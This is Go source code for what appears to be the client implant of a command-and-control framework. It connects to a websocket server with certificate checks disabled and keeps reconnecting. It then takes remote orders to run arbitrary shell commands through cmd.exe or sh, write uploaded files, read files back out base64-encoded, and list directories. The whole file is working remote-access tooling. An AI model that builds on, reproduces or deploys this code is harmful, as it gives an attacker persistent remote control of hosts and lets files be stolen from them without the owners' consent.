package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"c2/common"

	"github.com/gorilla/websocket"
)

func runCommand(cmd string) (out string, errStr string) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd.exe", "/c", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	outB, err := c.CombinedOutput()
	out = string(outB)
	if err != nil {
		errStr = err.Error()
	}
	return
}

const maxFileSize = 5 * 1024 * 1024

func doUpload(path string, contentB64 string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	bytes, err := base64.StdEncoding.DecodeString(contentB64)
	if err != nil {
		return "", err.Error()
	}
	if len(bytes) > maxFileSize {
		return "", "file too large"
	}
	dir := filepath.Dir(path)
	if dir != "." {
		os.MkdirAll(dir, 0755)
	}
	if err := os.WriteFile(path, bytes, 0644); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func doDownload(path string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	info, err := os.Stat(path)
	if err != nil {
		return "", err.Error()
	}
	if info.IsDir() {
		return "", "is a directory"
	}
	if info.Size() > maxFileSize {
		return "", "file too large"
	}
	bytes, err := os.ReadFile(path)
	if err != nil {
		return "", err.Error()
	}
	return base64.StdEncoding.EncodeToString(bytes), ""
}

func doListDir(path string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	if path == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err.Error()
	}
	type ent struct {
		Name string `json:"name"`
		Dir  bool   `json:"dir"`
		Size int64  `json:"size"`
	}
	var list []ent
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		if info != nil && !info.IsDir() {
			size = info.Size()
		}
		list = append(list, ent{Name: e.Name(), Dir: e.IsDir(), Size: size})
	}
	b, _ := json.Marshal(list)
	return string(b), ""
}

func main() {
	config := LoadConfig()
	wsURL := config.ServerURL
	if wsURL == "" {
		wsURL = "wss://localhost:8443/live"
	}

	for {
		dialer := websocket.Dialer{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		conn, _, err := dialer.Dial(wsURL, nil)
		if err != nil {
			log.Printf("Connect failed: %v; retry in 30s", err)
			time.Sleep(30 * time.Second)
			continue
		}
		defer conn.Close()

		auth := map[string]string{
			"client_id":     config.ClientID,
			"client_secret": config.ClientSecret,
		}
		if err := conn.WriteJSON(auth); err != nil {
			log.Printf("Auth send failed: %v", err)
			return
		}

		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				log.Printf("Read failed: %v", err)
				break
			}
			var cmd common.Command
			if err := json.Unmarshal(message, &cmd); err != nil {
				continue
			}
			var resp common.Response
			resp.CommandID = cmd.ID
			switch cmd.Type {
			case common.CmdPing:
				resp.Status = "success"
				resp.Output = "pong"
			case common.CmdExec:
				cmdStr := cmd.Args["command"]
				out, errStr := runCommand(cmdStr)
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdUpload:
				out, errStr := doUpload(cmd.Args["path"], cmd.Args["content"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdDownload:
				out, errStr := doDownload(cmd.Args["path"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdListDir:
				out, errStr := doListDir(cmd.Args["path"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			default:
				resp.Status = "error"
				resp.Error = "unknown command type: " + cmd.Type
			}
			if err := conn.WriteJSON(resp); err != nil {
				log.Printf("Write response failed: %v", err)
				break
			}
		}
		conn.Close()
		log.Printf("Disconnected; reconnecting in 30s")
		time.Sleep(30 * time.Second)
	}
}
